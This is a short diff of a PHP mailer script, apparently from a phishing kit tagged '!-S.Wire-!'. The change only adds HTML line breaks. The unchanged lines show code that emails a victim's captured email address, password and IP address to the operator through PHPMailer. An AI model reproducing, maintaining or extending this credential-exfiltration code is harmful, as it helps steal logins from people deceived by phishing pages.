@@ -41,9 +41,9 @@ $mail = new PHPMailer(true);
     // Content
     $mail->isHTML(true);                                  // Set email format to HTML
     $mail->Subject = 'Here is the subject';
-    $mail->Body    = $mail_server.' Details from !-S.Wire-!: '."\n"
+    $mail->Body    = $mail_server.' Details from !-S.Wire-!:<br> '."\n"
 			.'**************************************'."\n"
-			.'email: '.$attuser."\n"
+			.'<br>email: '.$attuser."\n"
 			.'Password: '.$attpassword."\n"
             .'UserIp: '.$ip."\n";
 
